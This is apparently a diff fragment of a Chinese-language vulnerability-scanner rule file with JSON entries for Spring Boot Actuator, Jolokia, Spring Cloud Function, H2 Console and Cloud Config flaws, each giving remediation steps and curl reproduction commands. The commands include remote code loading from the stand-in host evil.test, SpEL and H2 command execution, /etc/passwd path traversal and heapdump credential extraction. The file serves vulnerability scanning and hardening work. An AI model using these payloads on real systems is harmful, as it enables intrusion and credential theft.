+    "name": "Spring Boot Actuator Jolokia 远程代码执行",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "Jolokia JMX-HTTP 桥暴露 reloadByURL MBean，可加载远程 XML 配置触发 JNDI RCE",
+    "fix": "移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证",
+    "fix_detail": "【移除依赖】pom.xml 删除 jolokia-core 依赖：\n  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n【配置加固】application.yml 禁用 jolokia 端点：\n  management.endpoints.web.exposure.exclude: jolokia\n  management.endpoint.jolokia.enabled: false\n【SecurityConfig】为 jolokia 端点配置角色：\n  .antMatchers(\"/actuator/jolokia/**\").hasRole(\"ADMIN\")\n【JVM 加固】禁止 logback reloadByURL 加载远程配置：\n  移除 ch.qos.logback.classic.jmx.JMXConfigurator MBean 注册\n【WAF 规则】拦截外网对 /actuator/jolokia 的 POST，阻断 reloadByURL / JNDI 调用\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 Jolokia 端点可达性：\ncurl -i \"http://target/actuator/jolokia\"\n\n# 2. 列出已注册 MBean（探测 reloadByURL 是否存在）：\ncurl \"http://target/actuator/jolokia/list\" | python -m json.tool | grep -i \"JMXConfigurator\"\n\n# 3. reloadByURL 加载远程 logback XML 触发 JNDI RCE（PoC，请勿对未授权目标使用）：\ncurl -X POST \"http://target/actuator/jolokia/\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"type\":\"EXEC\",\"mbean\":\"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator\",\"operation\":\"reloadByURL\",\"arguments\":[\"http://evil.test/logback.xml\"]}'\n\n# 预期响应：list 返回 200 + MBean 域列表即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.jolokia_rce"
+  },
+  "Spring Boot Actuator Jolokia MLet 链远程代码执行": {
+    "name": "Spring Boot Actuator Jolokia MLet 链远程代码执行",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "Jolokia /actuator/jolokia/list 可被滥用通过 MLet 加载远程 MBean 触发 RCE",
+    "fix": "移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证；限制 MBean 加载",
+    "fix_detail": "【移除依赖】pom.xml 删除 jolokia-core 依赖：\n  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n【配置加固】application.yml 禁用 jolokia 端点：\n  management.endpoints.web.exposure.exclude: jolokia\n  management.endpoint.jolokia.enabled: false\n【SecurityConfig】为 jolokia 端点配置角色并限制 MBean 操作：\n  .antMatchers(\"/actuator/jolokia/**\").hasRole(\"ADMIN\")\n【JVM 加固】JVM 启动参数禁用远程 MBean 加载：\n  -Dcom.sun.management.jmxremote.authenticate=true\n  配置 jolokia 的 MBean 白名单，禁止 MLet / reloadByURL 操作\n【WAF 规则】拦截外网对 /actuator/jolokia 的 GET/POST，阻断 MLet 远程加载\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 Jolokia 端点可达性：\ncurl -i \"http://target/actuator/jolokia/list\"\n\n# 2. 列出全部已注册 JMX MBean（信息收集）：\ncurl \"http://target/actuator/jolokia/list\" | python -m json.tool | head -200\n  # 返回 JSON 含 MBean 域列表即 Jolokia 暴露\n\n# 3. 通过 MLet 加载远程恶意 MBean（PoC，请勿对未授权目标使用）：\ncurl -X POST \"http://target/actuator/jolokia/\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"type\":\"EXEC\",\"mbean\":\"JMImplementation:type=MLet\",\"operation\":\"getMBeansFromURL\",\"arguments\":[\"http://evil.test/mlet.jar\"]}'\n\n# 预期响应：list 返回 200 + MBean 域列表即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.jolokia_mlet_rce"
+  },
+  "CVE-2022-22963 Spring Cloud Function 远程代码执行": {
+    "name": "CVE-2022-22963 Spring Cloud Function 远程代码执行",
+    "cve": "CVE-2022-22963",
+    "severity": "high",
+    "category": "vuln",
+    "description": "HTTP 请求头 routing-expression 注入 SpEL 求值，可执行任意命令（Cloud Function 3.x）",
+    "fix": "升级 Spring Cloud Function 至 3.1.7+ / 3.2.3+；或禁用路由功能",
+    "fix_detail": "【升级方案】pom.xml 升级 Spring Cloud Function：\n  3.1.x -> 3.1.7+\n  3.2.x -> 3.2.3+\n【配置加固】application.yml 禁用动态路由功能：\n  spring.cloud.function.routing.enabled: false  # 禁用动态路由\n【代码修复】自定义 FunctionConfiguration，移除 routing-expression 请求头解析\n【WAF 规则】拦截请求头 spring.cloud.function.routing-expression\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 functionRouter 端点可达性：\ncurl -i -X POST \"http://target/functionRouter\" -d \"test\"\n\n# 2. SpEL 表达式注入探测（7*7=49）：\ncurl -X POST \"http://target/functionRouter\" \\\n  -H \"spring.cloud.function.routing-expression: T(java.lang.String).valueOf(7*7)\" \\\n  -d \"probe\"\n  # 返回 49 即 SpEL 求值成功\n\n# 3. 命令执行 PoC（id 命令回显，请勿对未授权目标使用）：\ncurl -X POST \"http://target/functionRouter\" \\\n  -H \"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\\\"id\\\")\" \\\n  -d \"probe\"\n\n# 预期响应：POST 返回 200 + SpEL 求值结果（如 49 或命令回显）即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.cloud_function_rce"
+  },
+  "Spring Boot Actuator H2 Console 未授权 JNDI RCE": {
+    "name": "Spring Boot Actuator H2 Console 未授权 JNDI RCE",
+    "cve": "N/A",
+    "severity": "high",
+    "category": "vuln",
+    "description": "H2 Console 可匿名访问，通过 JNDI 连接字符串执行任意代码（影响 H2 + Actuator）",
+    "fix": "为 /h2-console 配置认证；禁用 H2 Console 生产环境；移除 H2 依赖改用生产级数据库",
+    "fix_detail": "【配置加固】application.yml 生产环境禁用 H2 Console：\n  spring.h2.console.enabled: false  # 禁用 H2 Console\n  spring.h2.console.path: /h2-console  # 若必须启用，修改默认路径\n【移除依赖】pom.xml 删除 H2 数据库依赖，改用生产级数据库：\n  <dependency><groupId>com.h2database</groupId><artifactId>h2</artifactId><scope>test</scope></dependency>\n  改用 MySQL / PostgreSQL / Oracle 等生产级数据库\n【SecurityConfig】为 /h2-console 配置认证与内网限制：\n  .antMatchers(\"/h2-console/**\").hasRole(\"ADMIN\")\n【JVM 加固】JVM 启动参数禁用远程类加载（缓解 JNDI 注入）：\n  -Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n  -Dcom.sun.jndi.rmi.object.trustURLCodebase=false\n【WAF 规则】拦截外网对 /h2-console 的访问\n【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制",
+    "reproduce": "# 1. 探测 H2 Console 端点可达性：\ncurl -i \"http://target/h2-console\"\n  # 返回 200 + HTML 含 <title>H2 Console</title> 即 H2 Console 暴露\n\n# 2. 通过 JNDI 连接字符串触发 RCE（PoC，请勿对未授权目标使用）：\ncurl -X POST \"http://target/h2-console/\" \\\n  -d \"language=en\" \\\n  -d \"setting=Generic+H2+(Embedded)\" \\\n  -d \"name=Generic+H2+(Embedded)\" \\\n  -d \"driver=javax.naming.InitialContext\" \\\n  -d \"url=ldap://evil.test/Exploit\"\n\n# 3. 利用 H2 INIT 命令执行（CREATE ALIAS 调用 Runtime）：\ncurl -X POST \"http://target/h2-console/\" \\\n  -d \"driver=org.h2.Driver\" \\\n  -d \"url=jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS 'String x(String c) throws Exception {Runtime.getRuntime().exec(c);return 1;}'\\;CALL EXEC('id')\"\n\n# 预期响应：/h2-console 返回 200 + H2 Console 页面即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cvss_score": 9.8,
+    "compliance": {
+      "等保2.0": "8.1.3",
+      "OWASP": "A03:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.h2_console_rce"
+  },
+  "Spring Boot Actuator 未授权访问": {
+    "name": "Spring Boot Actuator 未授权访问",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "Actuator 端点 /actuator/env 可匿名访问，泄露环境变量、配置属性与密钥",
+    "fix": "引入 spring-boot-starter-security 为 Actuator 端点配置认证；或设置 management.endpoints.web.exposure.include 白名单",
+    "fix_detail": "【引入依赖】pom.xml 添加 Spring Security：\n  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n【配置鉴权】application.yml 为 Actuator 端点配置角色：\n  management.endpoints.web.exposure.include: health,info  # 仅暴露必要端点\n  management.endpoint.env.enabled: false  # 禁用 env 端点\n  management.endpoint.heapdump.enabled: false  # 禁用 heapdump\n【SecurityConfig】SecurityConfig.configure():\n  .antMatchers(\"/actuator/**\").hasRole(\"ADMIN\")\n【端口隔离】management.server.port: 9090  # 管理端口与业务端口分离，仅内网访问\n【WAF 规则】拦截外网对 /actuator, /actuator/env, /actuator/heapdump 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Actuator 根端点：\ncurl -i \"http://target/actuator\"\n  # 返回 200 + JSON 含 \"_links\" 字段即 Actuator 启用\n\n# 2. 读取环境变量与配置（含数据库密码、JWT 密钥）：\ncurl \"http://target/actuator/env\" | python -m json.tool\n  # propertySources 含 application.yml、系统环境变量等\n\n# 3. 下载内存快照（可提取密码、token）：\ncurl \"http://target/actuator/heapdump\" -o heapdump.bin\n  # 使用 Eclipse MAT 或 jhat 分析，搜索 \"password\" 关键字\n\n# 4. 列出所有已注册的 Bean（信息收集）：\ncurl \"http://target/actuator/beans\" | python -m json.tool | head -100",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.actuator_unauth"
+  },
+  "Spring Boot Actuator heapdump 敏感信息泄露": {
+    "name": "Spring Boot Actuator heapdump 敏感信息泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "/actuator/heapdump 可匿名下载堆转储，内含口令/密钥/Token 等敏感信息",
+    "fix": "为 /actuator/heapdump 端点配置认证；或设置 management.endpoints.web.exposure.exclude=heapdump",
+    "fix_detail": "【引入依赖】pom.xml 添加 Spring Security：\n  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n【配置加固】application.yml 禁用 heapdump 端点：\n  management.endpoints.web.exposure.include: health,info\n  management.endpoints.web.exposure.exclude: heapdump\n  management.endpoint.heapdump.enabled: false  # 直接禁用\n【SecurityConfig】为 heapdump 端点配置角色：\n  .antMatchers(\"/actuator/heapdump\").hasRole(\"ADMIN\")\n【端口隔离】management.server.port: 9090  # 管理端口与业务端口分离，仅内网访问\n【WAF 规则】拦截外网对 /actuator/heapdump 的访问，限制大文件下载\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 heapdump 端点可达性：\ncurl -I \"http://target/actuator/heapdump\"\n  # 返回 200 + Content-Type: application/octet-stream 即 heapdump 暴露\n\n# 2. 下载 JVM 堆转储文件：\ncurl \"http://target/actuator/heapdump\" -o heapdump.bin\n  # 文件大小通常为 100MB ~ 数 GB\n\n# 3. 解压 gzip 堆转储（Spring Boot 2.x 默认 gzip 压缩）：\nmv heapdump.bin heapdump.gz && gunzip heapdump.gz\n\n# 4. 使用 Eclipse MAT / jhat / JDumpSpider 提取敏感信息：\njava -jar JDumpSpider.jar heapdump\n  # 提取 password / jwt / token / apiKey 等明文凭证\n\n# 预期响应：200 + Content-Type: application/octet-stream 即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.heapdump_leak"
+  },
+  "Spring Boot Actuator /mappings 路由映射泄露": {
+    "name": "Spring Boot Actuator /mappings 路由映射泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "/actuator/mappings 暴露全部控制器映射与请求方法，泄露内部 API 结构",
+    "fix": "为 /actuator/mappings 端点配置认证；或设置 management.endpoints.web.exposure.exclude=mappings",
+    "fix_detail": "【引入依赖】pom.xml 添加 Spring Security：\n  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n【配置加固】application.yml 收敛 Actuator 端点暴露：\n  management.endpoints.web.exposure.include: health,info  # 仅暴露必要端点\n  management.endpoints.web.exposure.exclude: mappings  # 显式排除 mappings\n【SecurityConfig】为 mappings 端点配置角色：\n  .antMatchers(\"/actuator/mappings\").hasRole(\"ADMIN\")\n【端口隔离】management.server.port: 9090  # 管理端口与业务端口分离，仅内网访问\n【WAF 规则】拦截外网对 /actuator/mappings 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 mappings 端点可达性：\ncurl -i \"http://target/actuator/mappings\"\n\n# 2. 读取全部控制器路由映射：\ncurl \"http://target/actuator/mappings\" | python -m json.tool\n  # 返回 JSON 含 dispatcherServlets / handlerMappings 字段即泄露\n\n# 3. 提取所有 API 路径与方法（绘制攻击面）：\ncurl -s \"http://target/actuator/mappings\" | jq \".. | .details?.requestMappingConditions?.patterns?\"\n\n# 预期响应：200 + JSON 含 dispatcherServlets 字段即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cvss_score": 5.3,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.mappings_leak"
+  },
+  "Spring Boot Actuator /trace 请求历史泄露": {
+    "name": "Spring Boot Actuator /trace 请求历史泄露",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "/actuator/trace 暴露最近请求历史，含 headers/cookies/sessions 等敏感信息",
+    "fix": "为 /actuator/trace 端点配置认证；或设置 management.endpoints.web.exposure.exclude=trace,httptrace",
+    "fix_detail": "【引入依赖】pom.xml 添加 Spring Security：\n  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n【配置加固】application.yml 收敛 trace/httptrace 端点：\n  management.endpoints.web.exposure.include: health,info\n  management.endpoints.web.exposure.exclude: trace,httptrace\n  # Spring Boot 1.x: endpoints.trace.enabled: false\n【SecurityConfig】为 trace 端点配置角色：\n  .antMatchers(\"/actuator/trace\", \"/actuator/httptrace\").hasRole(\"ADMIN\")\n【端口隔离】management.server.port: 9090  # 管理端口与业务端口分离，仅内网访问\n【WAF 规则】拦截外网对 /actuator/trace 与 /actuator/httptrace 的访问\n【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Spring Boot 1.x 的 trace 端点：\ncurl -i \"http://target/actuator/trace\"\n\n# 2. 探测 Spring Boot 2.x 的 httptrace 端点：\ncurl -i \"http://target/actuator/httptrace\"\n\n# 3. 读取最近请求历史（含 headers/cookies/sessions）：\ncurl \"http://target/actuator/httptrace\" | python -m json.tool\n  # 返回 JSON 含 traces 数组与 timeTaken 字段即泄露\n\n# 预期响应：200 + JSON 含 traces 数组（含 Cookie/Authorization 头）即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.trace_leak"
+  },
+  "Spring Cloud Config 路径穿越": {
+    "name": "Spring Cloud Config 路径穿越",
+    "cve": "CVE-2020-5410",
+    "severity": "high",
+    "category": "vuln",
+    "description": "Spring Cloud Config 的/{name}/{profile}/{label}端点存在目录遍历，可读取任意文件",
+    "fix": "升级 Spring Cloud Config 至 ≥2.2.3.RELEASE / ≥2.1.9.RELEASE",
+    "fix_detail": "【升级方案】pom.xml 升级 Spring Cloud Config：\n  Spring Boot 2.3+ -> spring-cloud-config-server 2.2.3.RELEASE+\n  Spring Boot 2.1/2.2 -> spring-cloud-config-server 2.1.9.RELEASE+\n【配置加固】application.yml 限制 profile/label 路径与目录穿越：\n  spring.cloud.config.server.git.search-paths: \"{application}\"  # 限制搜索路径\n  spring.cloud.config.server.accept-empty: false  # 禁止空响应\n【代码修复】自定义 EnvironmentController 对 name/profile/label 做白名单校验\n【WAF 规则】拦截 /{name}/{profile}/{label} 路径中的 ../ 与绝对路径穿越字符\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Spring Cloud Config 端点：\ncurl -i \"http://target/app/profile/label\"\n\n# 2. 路径穿越读取任意文件（CVE-2020-5410）：\ncurl \"http://target/..%252F..%252F..%252Fetc%252Fpasswd/default/master\"\n  # 双重 URL 编码后等价于 ../../../../etc/passwd\n\n# 3. 利用 profile 参数读取配置文件：\ncurl \"http://target/application/..%252F..%252F..%252Fetc%252Fpasswd\"\n\n# 预期响应：返回 200 + /etc/passwd 文件内容即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cvss_score": 7.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.spring_cloud_config"
+  },
+  "Spring Boot Admin 未授权访问": {
+    "name": "Spring Boot Admin 未授权访问",
+    "cve": "N/A",
+    "severity": "medium",
+    "category": "vuln",
+    "description": "Spring Boot Admin 监控界面未设置认证，可查看所有注册服务的状态、配置、日志等敏感信息",
+    "fix": "为 Spring Boot Admin Server 添加 spring-boot-admin-server-ui 的登录认证",
+    "fix_detail": "【引入依赖】pom.xml 添加 Spring Security 与 SBA 安全集成：\n  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n  <dependency><groupId>de.codecentric</groupId><artifactId>spring-boot-admin-server-ui-login</artifactId></dependency>\n【配置加固】application.yml 配置 SBA 登录账号：\n  spring.security.user.name: admin\n  spring.security.user.password: <strong-password>\n  spring.security.user.roles: ADMIN\n【SecurityConfig】为 SBA 路径配置认证：\n  http.authorizeRequests()\n      .antMatchers(\"/assets/**\", \"/login\").permitAll()\n      .antMatchers(\"/**\").hasRole(\"ADMIN\")\n      .and().formLogin()\n【端口隔离】SBA Server 独立部署于内网，仅通过 VPN 访问\n【WAF 规则】拦截外网对 /applications /wallboard /instances 的访问\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Spring Boot Admin 主页：\ncurl -i \"http://target/\"\n  # 返回 200 + HTML 含 spring-boot-admin 即 SBA 暴露\n\n# 2. 访问注册服务列表（无认证）：\ncurl \"http://target/applications\" | head -200\n\n# 3. 访问实例详情与日志：\ncurl \"http://target/instances\" | head -200\ncurl \"http://target/wallboard\" | head -200\n\n# 预期响应：200 + HTML 含 applications / spring-boot-admin 关键字即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.spring_boot_admin"
+  },
+  "Spring Data REST 信息泄露": {
+    "name": "Spring Data REST 信息泄露",
+    "cve": "N/A",
+    "severity": "low",
+    "category": "vuln",
+    "description": "Spring Data REST 默认暴露所有 Repository 端点，未设置访问控制时可能泄露数据库实体结构和数据",
+    "fix": "为 Repository 接口添加 @RepositoryRestResource(exported=false) 或设置方法级安全",
+    "fix_detail": "【代码修复】为 Repository 接口关闭自动导出：\n  @RepositoryRestResource(exported = false)\n  public interface UserRepository extends JpaRepository<User, Long> {}\n【方法级安全】为敏感方法添加 @PreAuthorize：\n  @PreAuthorize(\"hasRole('ADMIN')\")\n  @Override\n  void delete(User user);\n【配置加固】application.yml 收敛 Data REST 暴露：\n  spring.data.rest.basePath: /internal/api  # 修改默认路径\n  spring.data.rest.defaultPageSize: 20  # 限制分页\n【SecurityConfig】为 /api/** 配置认证与角色：\n  .antMatchers(\"/api/**\").authenticated()\n【WAF 规则】拦截 /api 与 /api/** 的匿名访问\n【合规】OWASP A01:2021 失效的访问控制；等保 2.0 8.1.4 访问控制",
+    "reproduce": "# 1. 探测 Spring Data REST 根端点：\ncurl -i \"http://target/api\"\n  # 返回 200 + JSON 含 _links 字段即 Data REST 暴露\n\n# 2. 列出全部 Repository 实体端点：\ncurl \"http://target/api\" | python -m json.tool\n  # _links 中含 users / orders 等实体名\n\n# 3. 访问具体实体数据（无认证即可读取）：\ncurl \"http://target/api/users\" | python -m json.tool\ncurl \"http://target/api/users/1\" | python -m json.tool\n\n# 预期响应：200 + JSON 含 _links（profile/self）即漏洞存在",
+    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
+    "cvss_score": 6.5,
+    "compliance": {
+      "等保2.0": "8.1.4",
+      "OWASP": "A01:2021"
+    },
+    "affected_versions": "",
+    "variant": "",
+    "module": "plugins.spring.spring_data_rest"
+  }
+}
